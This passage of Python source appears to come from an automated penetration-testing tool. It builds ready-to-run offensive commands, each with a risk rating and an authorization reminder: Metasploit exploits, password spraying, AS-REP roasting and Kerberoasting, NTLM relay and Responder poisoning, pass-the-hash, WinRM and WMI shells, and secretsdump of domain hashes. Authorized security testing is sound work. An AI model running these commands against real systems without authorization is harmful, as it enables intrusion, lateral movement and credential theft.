) -> List[EngagementAction]:
    """One action per Phase-2-suggested Metasploit module.

    Trigger: state.msf_modules non-empty (or CVE-2020-1938 in
    cve_findings — Ghostcat fast-path is synthesized here when the MSF
    cross-reference didn't run).
    Risk: CRITICAL by default; MEDIUM for the Ghostcat aux module.
    """
    if not primary_host:
        return []
    msf_pairs = list(state.msf_modules)
    cve_blob = {c.upper() for c in state.cve_findings}
    has_ghost_pair = any(
        "tomcat_ghostcat" in m.lower() for _c, m in msf_pairs
    )
    if "CVE-2020-1938" in cve_blob and not has_ghost_pair:
        msf_pairs.append(
            ("CVE-2020-1938", "auxiliary/admin/http/tomcat_ghostcat")
        )
    out: List[EngagementAction] = []
    seen = set()
    for cve, mod in msf_pairs:
        cve = cve.upper()
        if cve in seen:
            continue
        seen.add(cve)
        if "tomcat_ghostcat" in mod.lower():
            out.append(EngagementAction(
                name="Ghostcat file read",
                description=(
                    f"metasploit {mod} — read /WEB-INF/web.xml from "
                    f"{primary_host}:8009 via the AJP connector"
                ),
                command=[
                    "msfconsole", "-q", "-x",
                    f"use {mod}; "
                    f"set RHOSTS {primary_host}; "
                    "set RPORT 8009; "
                    "set FILENAME /WEB-INF/web.xml; "
                    "run; exit",
                ],
                risk="MEDIUM",
                expected_output=(
                    "On success: contents of /WEB-INF/web.xml — a Java "
                    "servlet descriptor that often leaks credentials, "
                    "internal hostnames, and datasource JNDI names."
                ),
                required_tool="msfconsole",
                rationale=(
                    "CVE-2020-1938 (Ghostcat) lets unauthenticated "
                    "attackers read JSP/web.xml files via the AJP "
                    "connector on TCP/8009. The aux module only reads "
                    "— no shell — so impact is information disclosure "
                    "rather than RCE."
                ),
                finding_ref=cve,
            ))
            continue
        out.append(EngagementAction(
            name=f"MSF — {mod}",
            description=f"run {mod} against {primary_host} for {cve}",
            command=[
                "msfconsole", "-q", "-x",
                f"use {mod}; "
                f"set RHOSTS {primary_host}; "
                "show options; "
                "run; "
                "exit",
            ],
            risk="CRITICAL",
            expected_output=(
                "msfconsole prints module options, runs, and on success "
                "yields a session ID. Sessions land in msfconsole and "
                "must be interacted with there."
            ),
            required_tool="msfconsole",
            rationale=(
                f"Phase 2 cross-reference matched {cve} to {mod}. "
                "Running an exploit module is high-impact (can pop a "
                "shell, crash the service, or trigger logging on the "
                "blue team). Confirm authorization explicitly before "
                "executing."
            ),
            finding_ref=cve,
        ))
    return out


def _action_searchsploit_unmsf(
    state: ScanState, msf_covered: set,
) -> List[EngagementAction]:
    """Searchsploit detail dump for CVEs not covered by MSF.

    Capped at ``_SEARCHSPLOIT_CVE_CAP`` so the engagement queue isn't
    flooded when a target has 100+ historical CVEs (Shodan InternetDB
    routinely surfaces that many for old Linux servers). The aggregate
    InternetDB Finding still lists every CVE — the cap only shapes the
    interactive queue.

    Recent CVEs are kept preferentially: newer exploits are more likely
    to actually work against a current target, and old CVEs typically
    have widely-known fixes the operator can verify by other means.
    """
    out: List[EngagementAction] = []
    seen: set = set()

    def _year(c: str) -> int:
        try:
            return int(c.split("-")[1])
        except (IndexError, ValueError):
            return 0

    # Most recent CVEs first; cap how many actions we emit.
    sorted_cves = sorted(state.cve_findings, key=lambda c: -_year(c))
    for cve in sorted_cves[:_SEARCHSPLOIT_CVE_CAP]:
        cve_norm = cve.upper()
        if cve_norm in msf_covered or cve_norm in seen:
            continue
        seen.add(cve_norm)
        out.append(EngagementAction(
            name=f"searchsploit — {cve_norm}",
            description=f"print local exploit-db path + writeup for {cve_norm}",
            command=["searchsploit", "--cve", cve_norm, "-w"],
            risk="LOW",
            expected_output=(
                "title + EDB-ID + local path of any exploit hits. -w "
                "adds the exploit-db.com URL."
            ),
            required_tool="searchsploit",
            rationale=(
                f"{cve_norm} surfaced in Phase 2 but no Metasploit "
                "module matched. searchsploit shows what's available "
                "locally — manual review is the next step."
            ),
            finding_ref=cve_norm,
        ))
    return out


def _generate_searchsploit_actions(
    state: ScanState, msf_covered: set,
) -> List[EngagementAction]:
    """One engagement action per searchsploit hit (HIGH/CRITICAL/MEDIUM).

    Walks `state.searchsploit_hits` (populated by the Phase 2
    searchsploit runner with per-hit derived severity). Skips:
      - hits already covered by an MSF module action (CVE in msf_covered)
      - LOW-severity hits (info / DoS) — not actionable as engagement
        cards, but still visible in the searchsploit Phase-2 finding
      - duplicate EDB IDs across the matrix

    Each surviving hit becomes a card showing the local exploit-db
    path (operator can `searchsploit -m EDB-ID` to copy locally) plus
    a manual-exploitation rationale that names the originating
    service+version query so the operator knows which port it's for.
    """
    out: List[EngagementAction] = []
    seen_edb: set = set()
    for hit in state.searchsploit_hits:
        edb = hit.get("edb_id") or ""
        if edb and edb in seen_edb:
            continue
        if edb:
            seen_edb.add(edb)
        # Skip if any of this hit's CVEs is already wired to an MSF action.
        if any(c in msf_covered for c in hit.get("cves", [])):
            continue
        sev = (hit.get("severity") or "LOW").upper()
        if sev not in ("MEDIUM", "HIGH", "CRITICAL"):
            continue
        title = hit.get("title", "(untitled)").strip()
        path = hit.get("path", "")
        url = hit.get("url", "")
        query = hit.get("query", "")
        # Surface the EDB ID prominently in the card name so an operator
        # can grep their queue for it. Trim title length to stay tidy.
        short_title = title if len(title) <= 70 else title[:67] + "…"
        cmd: List[str]
        if edb:
            # `searchsploit -m <edb>` copies the exploit to cwd; the
            # operator then reviews + edits before running.
            cmd = ["searchsploit", "-m", str(edb)]
        else:
            # No EDB ID? Print the writeup with `-w` and let the
            # operator follow the link.
            cmd = ["searchsploit", "-w", query]
        rationale_bits = [
            f"Phase 2 searchsploit hit for query {query!r}: {title}.",
        ]
        if hit.get("cves"):
            rationale_bits.append(
                "Linked CVE(s): " + ", ".join(hit["cves"]) + "."
            )
        if path:
            rationale_bits.append(f"Local path: {path}.")
        if url:
            rationale_bits.append(f"Writeup: {url}.")
        rationale_bits.append(
            "This action only copies / prints the exploit — review the "
            "code and confirm authorization before running anything from "
            "the listed path."
        )
        out.append(EngagementAction(
            name=f"Exploit — {short_title}",
            description=(
                f"searchsploit copy/dump for EDB-{edb or '?'} "
                f"(severity: {sev})"
            ),
            command=cmd,
            risk=sev,
            expected_output=(
                "On `-m`: confirms the exploit was copied to the current "
                "directory. On `-w`: prints title + URL + local path."
            ),
            required_tool="searchsploit",
            rationale=" ".join(rationale_bits),
            finding_ref=f"searchsploit({query})",
            # Manual flag — searchsploit -m is read-only but the
            # *next* step (running the copied exploit) is what carries
            # the risk. Keeping the action as an active Execute is fine
            # because the copy itself is harmless.
        ))
    return out


# ----------------------------------------------------------------------
# Active brute-force tier (MEDIUM–HIGH)
# ----------------------------------------------------------------------


def _action_asrep_roast(
    state: ScanState, primary_host: str, ports: set, user_list: List[str],
) -> List[EngagementAction]:
    """AS-REP roasting — harvest hashes for users with pre-auth disabled.

    Trigger: 88 open + userlist + derivable domain.
    Risk: MEDIUM — no login attempt (so no lockout), but successful
    extractions yield offline-crackable hashes that leave the network.
    """
    if 88 not in ports or not primary_host or not user_list:
        return []
    domain = _domain_for_target(state) or "DOMAIN.LOCAL"
    users_file = _materialize_users_file(state, user_list)
    return [EngagementAction(
        name="AS-REP roasting",
        description=(
            f"impacket-GetNPUsers {domain}/ -usersfile {users_file} "
            f"-no-pass -dc-ip {primary_host} -format hashcat"
        ),
        command=[
            "impacket-GetNPUsers",
            f"{domain}/",
            "-usersfile", users_file,
            "-no-pass",
            "-dc-ip", primary_host,
            "-format", "hashcat",
        ],
        risk="MEDIUM",
        expected_output=(
            "Per-user output: `$krb5asrep$23$user@DOMAIN:hash...` for "
            "accounts with pre-auth disabled. `User <x> doesn't have "
            "UF_DONT_REQUIRE_PREAUTH set` for everyone else."
        ),
        required_tool="impacket-GetNPUsers",
        rationale=(
            "Active Directory accounts with 'Do not require Kerberos "
            "pre-authentication' set will hand out a TGT encrypted "
            "with the user's password hash to anyone who asks. This "
            "requests one for each user in the list — failures are "
            "silent (the user has pre-auth enabled, which is the "
            "default). Successes give offline-crackable hashes that "
            "leave the network. No login attempts, so account-lockout "
            "policies don't apply, but a SOC watching Kerberos logs "
            "will see the requests."
        ),
        finding_ref=f"open kerberos(88) + {len(user_list)} usernames",
    )]


# SSH and SMB brute-force actions are now generated declaratively from
# SERVICE_MATRIX via `_generate_credential_attacks` — see the engine
# section near the top of this file. Removing the bespoke helpers
# eliminates ~80 lines of mostly-duplicated code; adding new services
# (mssql / rdp / winrm / ftp / mysql / postgres / vnc / smtp / ...) is
# now one row instead of one helper.


# ----------------------------------------------------------------------
# Modern AD / internal post-exploitation — netexec, certipy, evil-winrm,
# ntlmrelayx + Responder hints, smbmap, bloodhound.py, printer pwnage
# ----------------------------------------------------------------------


def _action_nxc_smb_userenum(
    primary_host: str, ports: set,
) -> List[EngagementAction]:
    """``nxc smb <host>`` — fingerprint + signing/SMBv1 + null-session probe.

    netexec (formerly crackmapexec) is the single most common AD swiss-
    army CLI in 2026. A bare ``nxc smb`` against a host returns OS,
    domain, signing state and SMBv1 status in one shot. Trigger: 445
    open. Risk: LOW — one anonymous SMB negotiate.
    """
    if 445 not in ports or not primary_host:
        return []
    return [EngagementAction(
        name="netexec SMB fingerprint",
        description=f"nxc smb {primary_host}",
        command=["nxc", "smb", primary_host],
        risk="LOW",
        expected_output=(
            "One-line per host: name (OS) (domain:DOM) (signing:False) "
            "(SMBv1:True). signing:False is the trigger for ntlmrelayx; "
            "SMBv1:True is its own finding."
        ),
        required_tool="nxc",
        rationale=(
            "One probe captures the four facts that gate everything else "
            "in the AD post-exploit flow: OS family, domain membership, "
            "signing requirement, SMBv1 presence. Less noisy than "
            "enum4linux for the same data."
        ),
        finding_ref=f"open smb(445) on {primary_host}",
    )]


def _action_nxc_password_spray(
    state: ScanState, primary_host: str, ports: set, user_list: List[str],
) -> List[EngagementAction]:
    """``nxc smb -u <users> -p <pw> --continue-on-success`` spray.

    Risk: HIGH — generates a distinct failed-logon per user. Account
    lockout is the operator's problem; we surface a warning in the
    rationale and require the password to be filled in explicitly (no
    default spray list — too dangerous to ship as a one-clicker).
    Trigger: 445 open + userlist >= 2.
    """
    if 445 not in ports or not primary_host:
        return []
    if len(user_list) < 2:
        return []
    domain = _domain_for_target(state) or ""
    users_file = _materialize_users_file(state, user_list)
    domain_args = ["-d", domain] if domain else []
    return [EngagementAction(
        name=f"netexec SMB password spray ({len(user_list)} users)",
        description=(
            f"nxc smb {primary_host} -u <users> -p <password> "
            "--continue-on-success"
        ),
        command=[
            "nxc", "smb", primary_host,
            "-u", users_file,
            "-p", "REPLACE_WITH_PASSWORD",
            *domain_args,
            "--continue-on-success",
        ],
        risk="HIGH",
        expected_output=(
            "Per-user line. `[+]` for success, `[-]` for failure. "
            "STATUS_ACCOUNT_LOCKED_OUT means you tripped policy."
        ),
        required_tool="nxc",
        rationale=(
            "BEFORE running: pull the password policy with "
            f"`rpcclient -U '' -N {primary_host} -c querydominfo` so you "
            "know the lockout threshold. Spraying past it locks accounts "
            "and tips off the SOC. Replace REPLACE_WITH_PASSWORD with a "
            "single guess (`Spring2026!`, `<Company>2026!`, ...) before "
            "confirming."
        ),
        finding_ref=f"open smb(445) + {len(user_list)} usernames",
    )]


def _action_nxc_share_enum_with_creds(
    state: ScanState, primary_host: str, ports: set,
) -> List[EngagementAction]:
    """``nxc smb -u <user> -p <pw> --shares`` — once we have creds, walk shares."""
    if 445 not in ports or not primary_host or not state.confirmed_creds:
        return []
    out: List[EngagementAction] = []
    for user, pw, service in state.confirmed_creds[:5]:
        if service not in ("smb", "smbnt", "smb2", "any", "ssh"):
            continue
        out.append(EngagementAction(
            name=f"netexec SMB share enum — {user}@{primary_host}",
            description=f"nxc smb {primary_host} -u {user} -p <pw> --shares",
            command=[
                "nxc", "smb", primary_host,
                "-u", user, "-p", pw, "--shares",
            ],
            risk="LOW",
            expected_output=(
                "List of shares with READ / WRITE permissions for the "
                "supplied account. WRITE on anything but a profile / "
                "logon-script share is unusual and worth investigating."
            ),
            required_tool="nxc",
            rationale=(
                "Confirmed creds + nxc surfaces every share the account "
                "can touch in one call — faster than smbclient one share "
                "at a time."
            ),
            finding_ref=f"confirmed cred {user}/{service}",
        ))
    return out


def _action_smbmap_walk_with_creds(
    state: ScanState, primary_host: str, ports: set,
) -> List[EngagementAction]:
    """``smbmap -H <host> -u <user> -p <pw> -R`` — recursive content walk."""
    if 445 not in ports or not primary_host or not state.confirmed_creds:
        return []
    user, pw, service = state.confirmed_creds[0]
    if service not in ("smb", "smbnt", "smb2", "any", "ssh"):
        return []
    return [EngagementAction(
        name=f"smbmap recursive walk — {user}@{primary_host}",
        description=f"smbmap -H {primary_host} -u {user} -p <pw> -R",
        command=[
            "smbmap", "-H", primary_host,
            "-u", user, "-p", pw,
            "-R", "--depth", "5",
        ],
        risk="MEDIUM",
        expected_output=(
            "Tree-style listing of every readable share with file sizes "
            "and permissions. Useful for spotting backups, .git "
            "directories, password-bearing documents."
        ),
        required_tool="smbmap",
        rationale=(
            "Where nxc --shares stops at the share name, smbmap walks "
            "the contents — the canonical 'find the secrets' step "
            "after credentials confirm."
        ),
        finding_ref=f"confirmed cred {user}/{service} + smb(445)",
    )]


def _action_evil_winrm_with_creds(
    state: ScanState, primary_host: str, ports: set,
) -> List[EngagementAction]:
    """``evil-winrm -i <host> -u <user> -p <pw>`` — full WinRM shell."""
    winrm_port = next((p for p in (5985, 5986) if p in ports), 0)
    if not winrm_port or not primary_host or not state.confirmed_creds:
        return []
    user, pw, service = state.confirmed_creds[0]
    if service not in ("smb", "smbnt", "smb2", "any", "ssh", "winrm"):
        return []
    ssl_args = ["-S"] if winrm_port == 5986 else []
    return [EngagementAction(
        name=f"evil-winrm shell — {user}@{primary_host}:{winrm_port}",
        description=(
            f"evil-winrm -i {primary_host} -u {user} -p <pw>"
            + (" -S" if winrm_port == 5986 else "")
        ),
        command=[
            "evil-winrm",
            "-i", primary_host,
            "-u", user, "-p", pw,
            *ssl_args,
        ],
        risk="CRITICAL",
        expected_output=(
            "Interactive PowerShell session as <user>. WinRM doesn't "
            "require admin rights to land but most boxes only accept "
            "admin / Remote Management Users group members."
        ),
        required_tool="evil-winrm",
        rationale=(
            "WinRM with valid creds is the cleanest interactive shell on "
            "modern Windows — no Defender process-tree drama like "
            "wmiexec, no impacket dependency. If the cred works on SMB "
            "but not WinRM the account isn't in 'Remote Management "
            "Users'."
        ),
        finding_ref=f"confirmed cred {user}/{service} + winrm({winrm_port})",
    )]


def _action_certipy_find(
    state: ScanState, primary_host: str, ports: set, user_list: List[str],
) -> List[EngagementAction]:
    """``certipy find -u <user>@<dom> -p <pw> -dc-ip <host>`` — ADCS templates."""
    has_ldap = any(p in ports for p in (389, 636, 3268, 3269))
    if not has_ldap or not primary_host or not state.confirmed_creds:
        return []
    user, pw, service = state.confirmed_creds[0]
    domain = _domain_for_target(state) or "DOMAIN.LOCAL"
    return [EngagementAction(
        name="Certipy ADCS template enumeration",
        description=(
            f"certipy find -u {user}@{domain} -p <pw> "
            f"-dc-ip {primary_host} -vulnerable -stdout"
        ),
        command=[
            "certipy", "find",
            "-u", f"{user}@{domain}",
            "-p", pw,
            "-dc-ip", primary_host,
            "-vulnerable", "-stdout",
        ],
        risk="HIGH",
        expected_output=(
            "Per-template breakdown with ESC1-ESC13 markings. Any "
            "'Vulnerable to: ESC1' / 'ESC8' / 'ESC15' is an immediate "
            "domain-admin path."
        ),
        required_tool="certipy",
        rationale=(
            "Active Directory Certificate Services is the most common AD "
            "elevation path in 2026 — most environments have at least "
            "one ESC vector if ADCS is deployed. -vulnerable filters down "
            "to the templates that matter; the wider survey is in `find` "
            "without the flag."
        ),
        finding_ref=f"ldap+confirmed cred {user}@{domain}",
    )]


def _action_bloodhound_collection(
    state: ScanState, primary_host: str, ports: set,
) -> List[EngagementAction]:
    """``bloodhound-python -d <dom> -u <user> -p <pw> -c All``."""
    has_ldap = any(p in ports for p in (389, 636, 3268, 3269))
    if not has_ldap or not primary_host or not state.confirmed_creds:
        return []
    user, pw, service = state.confirmed_creds[0]
    domain = _domain_for_target(state) or "DOMAIN.LOCAL"
    return [EngagementAction(
        name="BloodHound (bloodhound.py) — full collection",
        description=(
            f"bloodhound-python -d {domain} -u {user} -p <pw> "
            f"-ns {primary_host} -c All"
        ),
        command=[
            "bloodhound-python",
            "-d", domain,
            "-u", user, "-p", pw,
            "-ns", primary_host,
            "-c", "All",
            "-zip",
        ],
        risk="MEDIUM",
        expected_output=(
            "BloodHound .json files (and a .zip wrapper) in the cwd. "
            "Drop the zip into BloodHound CE to walk attack paths."
        ),
        required_tool="bloodhound-python",
        rationale=(
            "BloodHound graph is the highest-leverage post-cred move on "
            "AD. -c All collects users / groups / computers / sessions / "
            "ACLs / domains / trusts in one pass. Run from outside the "
            "DC if possible — collection generates LDAP traffic the SOC "
            "can see."
        ),
        finding_ref=f"ldap+confirmed cred {user}@{domain}",
    )]


def _action_responder_hint(
    state: ScanState, primary_host: str, ports: set,
) -> List[EngagementAction]:
    """Manual-only Responder reminder — only valid on a local broadcast.

    We cannot auto-run Responder: it requires the operator to be on the
    same broadcast domain as the target, and it consumes local UDP/137-
    138 + SMB/HTTP ports, which usually conflicts with host services.
    Surface as manual_only when an LLMNR-relevant port is observed *or*
    the operator is on the internal profile.
    """
    if not primary_host:
        return []
    profile_key = getattr(state, "profile_key", "") or ""
    if not any(p in ports for p in (137, 138)) and "internal" not in profile_key:
        return []
    return [EngagementAction(
        name="Responder — LLMNR/NBT-NS/MDNS poisoning (manual only)",
        description=(
            "responder -I <iface> -wd  — capture NetNTLMv2 hashes from "
            "broadcast name-resolution failures."
        ),
        command=["responder", "-I", "REPLACE_WITH_INTERFACE", "-wd"],
        risk="HIGH",
        expected_output=(
            "Lines of the form `[SMB] NTLMv2-SSP Hash : <user>::<dom>:..."
            "` per captured handshake. NTLMv2 hashes go to hashcat mode "
            "5600."
        ),
        required_tool="responder",
        rationale=(
            "Internal-only attack: only works when you're on the same "
            "broadcast segment as targets that mistype names. Pair with "
            "ntlmrelayx for the relay flow if SMB signing isn't required "
            "(see `nxc smb` output for that)."
        ),
        finding_ref=f"internal-engagement context: {primary_host}",
        manual_only=True,
    )]


def _action_ntlmrelayx_hint(
    state: ScanState, primary_host: str, ports: set,
) -> List[EngagementAction]:
    """Manual-only ntlmrelayx hint when SMB present + signing-disabled signal."""
    if 445 not in ports or not primary_host:
        return []
    saw_unsigned = any(
        "signing" in (getattr(f, "raw", "") or "").lower()
        and "disabled" in (getattr(f, "raw", "") or "").lower()
        for f in (state.findings_phase1 + state.findings_phase2)
    )
    if not saw_unsigned:
        return []
    return [EngagementAction(
        name="ntlmrelayx — relay captured auth (manual only)",
        description=(
            "impacket-ntlmrelayx -tf targets.txt -smb2support — feed a "
            "targets list with SMB signing disabled, pair with Responder "
            "or mitm6 for the auth source."
        ),
        command=[
            "impacket-ntlmrelayx",
            "-tf", "REPLACE_WITH_TARGETS_FILE",
            "-smb2support",
        ],
        risk="CRITICAL",
        expected_output=(
            "Per-relay: `Authenticating against smb://<target>` then "
            "`SMB Server username:hashes` if relay succeeded. With "
            "-socks stays connected for follow-up attacks."
        ),
        required_tool="impacket-ntlmrelayx.py",
        rationale=(
            "SMB signing disabled + a coercion source (Responder, mitm6, "
            "PetitPotam) = NTLMv2 relay to any other host where the "
            "captured account has access. The CRITICAL fingerprint of "
            "internal AD; the moment SOC sees a 'message signing' alert "
            "they're already several minutes behind you."
        ),
        finding_ref=f"smb(445) signing-disabled on {primary_host}",
        manual_only=True,
    )]


def _action_printer_pwn(
    primary_host: str, ports: set,
) -> List[EngagementAction]:
    """Printer pwnage via PRET + nmap NSE — ports 631 (IPP) and 9100 (raw print).

    Network printers are routinely the most-accessible Windows-credentialed
    device on a flat network. PJL exposes the printer's filesystem
    (saved scans, baked-in LDAP creds, address books); IPP exposes job
    queues and CUPS metadata; the nmap printer-info NSE gives a fast
    fingerprint without needing PRET at all.
    """
    raw_print = 9100 in ports
    ipp = 631 in ports
    if not primary_host or not (raw_print or ipp):
        return []

    out: List[EngagementAction] = []

    if raw_print:
        out.append(EngagementAction(
            name=f"PRET — PJL filesystem walk on {primary_host}:9100",
            description=(
                f"pret.py {primary_host} pjl  — interactive shell, "
                "type `ls /` to walk the printer filesystem, `find /` "
                "to dump."
            ),
            command=["pret.py", primary_host, "pjl"],
            risk="LOW",
            expected_output=(
                "PRET drops you into a fake-shell against the printer's "
                "internal storage. Many enterprise printers leave saved "
                "scans, address books, and admin panels readable. Type "
                "`help` for the supported commands."
            ),
            required_tool="pret",
            rationale=(
                "Network printers are routinely the most-accessible "
                "Windows-credentialed device on a flat network. PRET's "
                "PJL channel reads the printer's filesystem — saved "
                "scans, LDAP credentials baked into the address book, "
                "previous job spools."
            ),
            finding_ref=f"open raw-print(9100) on {primary_host}",
            manual_only=True,
        ))
        out.append(EngagementAction(
            name=f"nmap printer-info NSE — {primary_host}",
            description=(
                f"nmap -p 9100,515,631 --script printer-info "
                f"{primary_host} — quick fingerprint + uptime + jobs."
            ),
            command=[
                "nmap", "-Pn", "-p", "9100,515,631",
                "--script", "printer-info", primary_host,
            ],
            risk="LOW",
            expected_output=(
                "NSE prints model + firmware + recent job count. Useful "
                "before deciding whether PRET is worth the time."
            ),
            required_tool="nmap",
            rationale=(
                "Cheap fingerprint pass. Lots of printers respond to "
                "this with surprisingly detailed info (model strings, "
                "fw version, sometimes IP / SNMP communities) without "
                "needing PRET at all."
            ),
            finding_ref=f"open print services on {primary_host}",
        ))
    if ipp:
        out.append(EngagementAction(
            name=f"PRET — IPP probe on {primary_host}:631",
            description=f"pret.py {primary_host} ipp  — interactive IPP shell.",
            command=["pret.py", primary_host, "ipp"],
            risk="LOW",
            expected_output=(
                "IPP attribute / job dump. CUPS servers expose a print "
                "queue and may leak username info from past jobs."
            ),
            required_tool="pret",
            rationale=(
                "IPP exposes more queue / job metadata than raw print; "
                "useful on macOS / CUPS targets where 9100 is closed but "
                "631 is open."
            ),
            finding_ref=f"open ipp(631) on {primary_host}",
            manual_only=True,
        ))
    return out


# ----------------------------------------------------------------------
# Cred-flow tier — gated on confirmed_creds / discovered_hashes
# ----------------------------------------------------------------------


def _actions_credflow(
    state: ScanState, primary_host: str, ports: set,
) -> List[EngagementAction]:
    """Post-credential lateral-movement actions.

    Triggers come from runtime state populated by other actions:
      - state.discovered_hashes  → pass-the-hash (HIGH)
      - state.confirmed_creds    → kerberoast / bloodhound (MEDIUM),
                                   wmiexec (CRITICAL),
                                   secretsdump (CRITICAL, admin-ish)

    These actions DON'T appear on the initial queue for a fresh scan;
    they materialize after a hydra hit (hooked by `_followups_from_output`)
    or a discovery file fetch surfaces NTLM hashes. The user can rebuild
    the queue (`r` in EngagementScreen) to see them once the source
    state field is populated.
    """
    out: List[EngagementAction] = []
    if not primary_host:
        return out
    domain = _domain_for_target(state) or "DOMAIN.LOCAL"

    # ---- Pass-the-hash (HIGH) — hash discovered, no password needed ----
    smb_open = bool({139, 445} & ports)
    if smb_open and state.discovered_hashes:
        for user, nthash, _typ in state.discovered_hashes[:5]:
            out.append(EngagementAction(
                name=f"Pass-the-hash SMB login — {user}",
                description=(
                    f"crackmapexec smb {primary_host} -u {user} -H "
                    f"<nthash> --shares — auth as {user} using the "
                    "captured NTLM hash"
                ),
                command=[
                    "crackmapexec", "smb", primary_host,
                    "-u", user, "-H", nthash, "--shares",
                ],
                risk="HIGH",
                expected_output=(
                    "On success: `[+] DOMAIN\\user (Pwn3d!)` and a "
                    "share table. On failure: `[-] STATUS_LOGON_FAILURE`."
                ),
                required_tool="crackmapexec",
                rationale=(
                    "If a captured NTLM hash is on hand, this attempts "
                    "SMB auth as that user — no password needed, the "
                    "hash IS the credential. A successful login lets "
                    "you list shares, run commands via wmiexec, or dump "
                    "the local SAM database. This is the technique "
                    "behind most lateral movement in real breaches; "
                    "HIGH-risk because a single hash often unlocks half "
                    "the network."
                ),
                finding_ref=f"discovered_hash({user})",
            ))

    # ---- Cred-flow on confirmed credentials ----
    for user, password, service in state.confirmed_creds:
        if service not in ("smb", "ssh", "any"):
            continue
        cred_ref = f"confirmed_cred({user}@{service})"
        looks_admin = _looks_admin(user)

        # Kerberoasting — any valid domain cred unlocks it.
        if 88 in ports:
            out.append(EngagementAction(
                name=f"Kerberoasting — as {user}",
                description=(
                    f"impacket-GetUserSPNs {domain}/{user}:<pw> "
                    f"-dc-ip {primary_host} -request -format hashcat"
                ),
                command=[
                    "impacket-GetUserSPNs",
                    f"{domain}/{user}:{password}",
                    "-dc-ip", primary_host,
                    "-request", "-format", "hashcat",
                ],
                risk="MEDIUM",
                expected_output=(
                    "Per service account: `$krb5tgs$23$*svc_acct$"
                    f"{domain}$...$<hash>`. Hashcat mode 13100."
                ),
                required_tool="impacket-GetUserSPNs",
                rationale=(
                    "With any valid domain credential you can request "
                    "Kerberos service tickets for every account that "
                    "has a Service Principal Name (SPN). These tickets "
                    "are encrypted with the service account's password "
                    "hash. Service accounts usually have weak, never-"
                    "rotated passwords, so cracking these offline often "
                    "yields high-privilege credentials. The request "
                    "looks like normal Kerberos traffic; the cracking "
                    "happens off-network."
                ),
                finding_ref=cred_ref,
            ))

        # BloodHound — needs LDAP-reachable DC + cred.
        if {389, 636} & ports:
            out.append(EngagementAction(
                name=f"BloodHound collection — as {user}",
                description=(
                    f"bloodhound-python -u {user} -p <pw> -d {domain} "
                    f"-dc {primary_host} -c All — full AD graph dump"
                ),
                command=[
                    "bloodhound-python",
                    "-u", user, "-p", password,
                    "-d", domain, "-dc", primary_host,
                    "-c", "All",
                ],
                risk="MEDIUM",
                expected_output=(
                    "Drops `<timestamp>_users.json`, `_groups.json`, "
                    "`_computers.json`, `_domains.json` etc. into the "
                    "current directory. Import into BloodHound GUI."
                ),
                required_tool="bloodhound-python",
                rationale=(
                    "Dumps the entire Active Directory layout — every "
                    "user, group, computer, ACL, and active session — "
                    "into a JSON archive that the BloodHound GUI graphs "
                    "into attack paths. From any compromised account, "
                    "BloodHound shows the shortest route to Domain "
                    "Admin. Heavy LDAP query traffic; visible to any "
                    "defender watching for it. Read-only."
                ),
                finding_ref=cred_ref,
            ))

        # WMIEXEC — admin-ish creds get RCE-via-SMB. CRITICAL.
        if smb_open and looks_admin:
            out.append(EngagementAction(
                name=f"WMI command exec — as {user}",
                description=(
                    f"impacket-wmiexec {domain}/{user}:<pw>@{primary_host} "
                    "— interactive shell over WMI/SMB"
                ),
                command=[
                    "impacket-wmiexec",
                    f"{domain}/{user}:{password}@{primary_host}",
                ],
                risk="CRITICAL",
                expected_output=(
                    "On success: drops into a `C:\\>` prompt where any "
                    "Windows command runs as `user`. wmiexec is the "
                    "quietest of the impacket exec trio — no service "
                    "binary written to disk."
                ),
                required_tool="impacket-wmiexec",
                rationale=(
                    f"User {user!r} looks admin-shaped and SMB is "
                    "reachable. wmiexec uses the Windows Management "
                    "Instrumentation interface to execute commands — "
                    "no service binary is written to disk (psexec) and "
                    "no shell is spawned (smbexec), so this is the "
                    "least noisy of the three. RCE on the target as "
                    f"{user!r}; full-host compromise."
                ),
                finding_ref=cred_ref,
            ))

        # Secretsdump — admin-ish creds dump the entire DC. CRITICAL.
        if smb_open and looks_admin:
            out.append(EngagementAction(
                name=f"Secretsdump (NTDS) — as {user}",
                description=(
                    f"impacket-secretsdump {domain}/{user}:<pw>"
                    f"@{primary_host} — dump every NTLM hash from "
                    "NTDS.dit"
                ),
                command=[
                    "impacket-secretsdump",
                    f"{domain}/{user}:{password}@{primary_host}",
                ],
                risk="CRITICAL",
                expected_output=(
                    "Streams `Administrator:500:LM:NT:::` lines for "
                    "every account in the domain. Tens of thousands "
                    "of hashes is normal."
                ),
                required_tool="impacket-secretsdump",
                rationale=(
                    "If you have credentials for a domain admin "
                    "account, this connects to the domain controller "
                    "and dumps the entire NTDS.dit database — every "
                    "user's NTLM hash for every account that has ever "
                    "existed in the domain. Tens of thousands of "
                    "hashes is normal. From there every account is "
                    "offline-crackable or directly usable via pass-"
                    "the-hash. There is no clean undo: those hashes "
                    "leave the network. Only run on engagements where "
                    "credential exfil is explicitly in scope."
                ),
                finding_ref=cred_ref,
            ))
    return out


# ----------------------------------------------------------------------
# Helpers
# ----------------------------------------------------------------------


def _domain_for_target(state: ScanState) -> str:
    """Best-effort Kerberos realm / DNS zone derivation from the target."""
    if state.target_type == "domain":
        return state.target
    if state.target_type == "url":
        from urllib.parse import urlparse
        return urlparse(state.target).hostname or ""
    return ""


def _common_wordlist() -> str:
    """First-existing common.txt wordlist for the vhost-fuzz action."""
    candidates = (
        "/opt/homebrew/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        "/usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt",
        "/opt/homebrew/share/seclists/Discovery/Web-Content/common.txt",
        "/usr/share/seclists/Discovery/Web-Content/common.txt",
    )
    for path in candidates:
        if os.path.exists(path):
            return path
    return ""


# Names that the cred-flow heuristic treats as "probably administrative".
# Lowercase exact match against either the bare local part or the
# pre-domain part of `DOMAIN\user`. False-positives here cost the
# operator a CRITICAL phrase-confirm dialog, not a real run, so we err
# toward being permissive.
_ADMIN_NAMES = {
    "administrator", "admin", "administrador", "root",
    "domain admin", "domain admins", "da", "ea",
    "svc_admin", "svc-admin", "backupadmin",
}


def _looks_admin(user: str) -> bool:
    name = user.split("\\")[-1].lower()
    return name in _ADMIN_NAMES or "admin" in name


# ----------------------------------------------------------------------
# Executor
# ----------------------------------------------------------------------


async def execute_action(
    ctx: ScanContext, llm: LLMClient, action: EngagementAction,
) -> AsyncIterator[PhaseEvent]:
    """Run an approved action, stream its output, and append to the
    engagement log. The caller is responsible for the risk-confirmation
    gate — by the time we get here, the user has approved.

    On completion, follow-up actions are appended to
    `ctx.state.engagement_actions`. The UI re-reads the queue after
    each execute to surface them.
